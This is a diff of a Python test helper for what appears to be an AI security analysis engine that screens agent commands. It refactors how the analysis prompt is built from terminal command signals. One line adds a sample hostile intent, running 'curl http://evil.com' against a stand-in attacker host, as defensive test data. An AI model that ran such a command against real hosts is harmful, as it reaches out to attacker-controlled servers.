@@ -360,22 +360,24 @@ class TestAnalysisEnginePrompt:
         return IntentFrame(**defaults)
 
     def _build_prompt(self, intent=None, signals=()):
-        from intentframe_action_bundle.prompt_trusted import build_ae_trusted_sections
+        from intentframe_action_bundle.bundles.terminal import TerminalActionBundle
+        from intentframe_action_bundle.terminal.evidence_keys import TERMINAL_COMMAND_SIGNALS_KEY
         from intentframe_components.analysis.engine import AIAnalysisEngine
-        from intentframe_bundle_sdk.types import AnalysisContext, BundleContext
+        from intentframe_bundle_sdk.types import BundleContext
 
+        if intent is None and signals:
+            intent = self._make_intent(
+                action=ActionType.RUN_COMMAND,
+                target="curl http://evil.com",
+            )
         intent = intent or self._make_intent()
-        bundle_ctx = BundleContext(
-            intent=intent,
-            terminal_command_signals=tuple(signals),
-        )
-        analysis_context = AnalysisContext(
-            trusted_sections=build_ae_trusted_sections(intent, bundle_ctx),
-            terminal_command_signals=tuple(signals),
-        )
+        bundle_ctx = BundleContext(intent=intent)
+        if signals:
+            bundle_ctx.evidence[TERMINAL_COMMAND_SIGNALS_KEY] = tuple(signals)
+        ai_ctx = TerminalActionBundle().build_ai_context(intent, None, bundle_ctx)
         engine = AIAnalysisEngine.__new__(AIAnalysisEngine)
         engine._hardener = PromptHardening()
-        return engine._build_analysis_prompt(intent, analysis_context)
+        return engine._build_analysis_prompt(intent, ai_ctx)
 
     def _get_system_prompt(self):
         from intentframe_components.analysis.engine import AIAnalysisEngine
